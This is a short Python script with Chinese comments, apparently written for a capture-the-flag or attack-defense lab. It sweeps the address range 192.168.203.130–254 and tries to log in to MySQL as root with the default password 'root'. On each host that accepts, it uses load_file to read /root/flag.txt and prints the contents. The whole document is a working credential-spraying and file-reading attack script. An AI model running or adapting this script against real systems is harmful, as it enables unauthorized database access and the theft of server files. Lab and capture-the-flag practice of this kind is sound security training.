import pymysql


#1.连接数据库。
def wang():
    for i in range(130,255):
        try:
            host="192.168.203."+str(i)
            db="mysql"
            user="root"
            password="root"
        
            

            conn=pymysql.connect(host=host,db=db,user=user,passwd=password,charset='utf8')
#2.创建数据库访问的游标。
            cursor=conn.cursor()
            print(host+"连接成功")
#3.使用execute执行sql语句。

    
            sql="select load_file('/root/flag.txt')";
            cursor.execute(sql)
#4.使用fetchone()方法获取单条数据。
            data=cursor.fetchone()


            print("获取的数据")
            print(data)
            conn.close()



        except:
            print("连接错误")
            print(host)

wang()
